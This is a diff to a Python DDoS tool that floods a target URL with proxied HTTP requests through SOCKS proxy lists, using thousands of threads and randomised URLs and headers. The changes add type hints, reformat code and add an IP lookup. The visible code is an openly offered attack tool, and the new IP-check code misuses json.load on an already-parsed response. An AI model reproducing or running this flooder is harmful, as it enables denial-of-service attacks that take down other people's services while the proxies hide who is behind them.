@@ -1,4 +1,5 @@
-import os, threading, datetime, socks, ssl, time, requests
+import os, datetime, socks, ssl, time, requests, json
+import threading
 from random import choice as Choice, randint as Intn
 from colorama import Fore as f, init
 
@@ -192,7 +193,7 @@ def make_random_url(strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcv
     return result
 
 
-def attack_thread(event, socks_type: int, target, port, protocol, multiple: int, path, proxies: list, cookies: str):
+def attack_thread(event: threading.Event, socks_type: int, target: str, port: int, protocol: str, multiple: int, path: str, proxies: list, cookies: str):
     header = make_header(target = target, path = path, cookies= cookies)
     proxy = Choice(proxies).strip().split(':')
     add = '&' if '?' in path else '?'
@@ -203,7 +204,7 @@ def attack_thread(event, socks_type: int, target, port, protocol, multiple: int,
     event.wait()
     while event.is_set():
         try:
-            # print('Touched this')
+            # print('Thread starting doing shit ig')
             s = socks.socksocket()
             s.set_proxy(socksType, proxy_ip, proxy_port)
             s.connect((target, port))
@@ -221,6 +222,7 @@ def attack_thread(event, socks_type: int, target, port, protocol, multiple: int,
         
 
 def main():
+    # input
     url = ''
     while url == '':
         url = str(input(quotes.TargetURL)).strip()
@@ -240,8 +242,7 @@ def main():
         try:
             thread_num = str(input(quotes.AskThreads)).strip()
             thread_num = 2000 if thread_num in ['0', ''] else int(thread_num)
-        except ValueError:
-            print(quotes.PleaseEnterANumber)
+        except ValueError: print(quotes.PleaseEnterANumber)
     proxies, proxiescount = ProxiesOptions(socks_type)
     attack_time = None
     while attack_time == None:
@@ -271,7 +272,7 @@ def main():
     print('[>] Waking up threads...')
     event.set() # start all threads
     print('[>] Started the attack! Press Ctrl + C (SIG.TERM) anytime to stop the attack.')
-    print('[*] WARNING: This might slow down your internet connection so you might experience lags even in dstats')
+    print('[*] WARNING: This might slow down your internet connection so you might experience lags even in dstats', end = '\n\n')
     start = time.time()
     while event.is_set() and (attack_time == 0 or time.time() - start <= attack_time):
         try:
@@ -303,14 +304,18 @@ if __name__ == '__main__':
         if test_allowed:
             print('[!] Something wrong with your connection! Checking with a aternative server...')
             try:
-                r = requests.get()
-            except:
-                print('[!] Your internet connection, too slow or... you dont have.')
-                input('Press enter to exit...')
+                r = requests.get('https://ipinfo.io/', timeout = 7)
+                r = json.load(r.json())
+                r = r['ip']
+            except Exception as e:
+                print(f'[!] Something wrong with your connection! error {e}')
+                input('Press Enter to exit...')
                 closeProgram()
-        else: 
+            else:
+                print('Done! Your IP address is: ' + r)
+        else:
             print('[!] Your internet connection, too slow or... you dont have.')
-            input('Press enter to exit...')
+            input('Press Enter to exit...')
             closeProgram()
     else:
         r = str(r.text)
